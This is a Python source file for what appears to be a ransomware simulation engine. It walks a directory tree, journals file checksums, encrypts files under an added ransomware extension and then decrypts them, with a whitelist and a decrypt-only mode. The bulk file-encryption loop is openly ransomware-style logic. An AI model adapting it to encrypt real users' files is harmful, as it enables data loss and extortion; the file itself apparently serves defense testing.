import os
from logger import Logger
from crypto_engine import CryptoEngine
from file_manager import File, Journal, List

class BaseEngine:
    def __init__(self, start_path, path_to_list, decrypt_mode):
        self.log = Logger.create_logger("Engine")
        self.start_path = start_path
        self.journal = Journal()
        self.is_decrypt_mode = decrypt_mode
        if self.is_decrypt_mode:
            self.log.info("Decrypt mode only enabled.")
        else:
            self.log.info("Decrypt mode only disabled.")

        if path_to_list:
            self.log.info("Whitelist enabled.")
            self.list = List(path_to_list)
            if self.list.content != 0:
                self.is_list = True
            else:
                self.is_list = False
        else:
            self.is_list = False

class Engine(BaseEngine):
    def __init__(self, start_path, path_to_list, rw_extension, decrypt_mode, key, iv):
        super().__init__(start_path, path_to_list, decrypt_mode)
        self._init_crypto(rw_extension, key, iv)
        self.log.info("Engine initiated.")

    def run(self):
        self.log.warning("Attack started.")
        self.log.info("Encryption and Decryption process started.")
        self.directory_walk()
        self.journal.save_journal()

    def directory_walk(self):
        source_files = []
        encrypted_files = []

        for root, dirs, files in os.walk(self.start_path, topdown=True):
            if self.is_list and not self.is_decrypt_mode:
                validated_dirs = self.validate_dirs(root, dirs)
                dirs[:] = [d for d in dirs if d in validated_dirs]
                validated_files = self.validate_files(root, files)
                files[:] = [f for f in files if f in validated_files]
            
            for f in files:
                file = File(filename=f, path_to_file=os.path.join(root, f))
                file.calc_checksum()
                if file.filename.endswith(self.crypto.extension):
                    file.is_encrypted = True
                source_files.append(file)

        for f in source_files:
            if not f.is_encrypted and not f.is_decrypted:
                f.calc_checksum()
                self.journal.save_into_journal(f)

        if not self.is_decrypt_mode:
            for f in source_files:
                if not f.is_encrypted and not f.is_decrypted:
                    bf = File(filename=f"{f.filename}{self.crypto.extension}", 
                            path_to_file=f"{f.path_to_file}{self.crypto.extension}")
                    self.crypto.encrypt(f)
                    bf.is_encrypted = True
                    bf.calc_checksum()
                    encrypted_files.append(bf)
                    self.journal.save_into_journal(bf)
            self.crypto.init_aes_obj()
        else:
            encrypted_files = source_files

        for f in encrypted_files:
            if f.is_encrypted and not f.is_decrypted:
                bf = File(filename=f"{f.filename[:-len(self.crypto.extension)]}", 
                            path_to_file=f"{f.path_to_file[:-len(self.crypto.extension)]}")
                self.crypto.decrypt(f)
                bf.is_encrypted = False
                bf.is_decrypted = True
                bf.calc_checksum()
                self.journal.save_into_journal(bf)

    def validate_files(self, root, files):
        validated_files = []
        for file in files:
            if file in self.list.content["files"]:
                validated_files.append(file)
            elif os.path.join(root, file) in self.list.content["files"]:
                validated_files.append(file)
        return validated_files

    def validate_dirs(self, root, dirs):
        validated_dirs = []
        for directory in dirs:
            if directory in self.list.content["dirs"]:
                validated_dirs.append(directory)
            elif os.path.join(root, directory) in self.list.content["dirs"]:
                validated_dirs.append(directory)
        return validated_dirs

    """ Low visability """

    def _init_crypto(self, rw_extension, key, iv):
        self.crypto = CryptoEngine(rw_extension, key, iv)